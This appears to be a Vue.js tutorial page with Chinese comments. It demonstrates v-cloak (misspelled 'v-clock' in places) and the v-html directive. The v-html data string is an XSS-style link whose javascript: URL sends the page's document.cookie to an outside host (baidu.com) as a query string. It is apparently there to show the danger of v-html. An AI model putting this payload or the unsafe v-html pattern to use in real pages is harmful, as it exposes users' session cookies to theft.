<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入 day.js cdn-->
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.7/dayjs.min.js"></script>
    <!-- 属性选择器，所有带 v-clock 的全部隐藏 -->
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
</head>

<body>
    <div id="app">
        <div v-html="str"></div>
        <!-- 当 Vue 加载的时候直接接管 v-clock，并删除这个属性 -->
        <h2 v-clock>{{time}}</h2>
        <script src="../js/vue.js"></script>
    </div>

    <script>
        let vm = new Vue({
            el: '#app',
            data: {
                time: 1683170740843,
                str: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我</a>'
            }
        })
    </script>
</body>

</html>
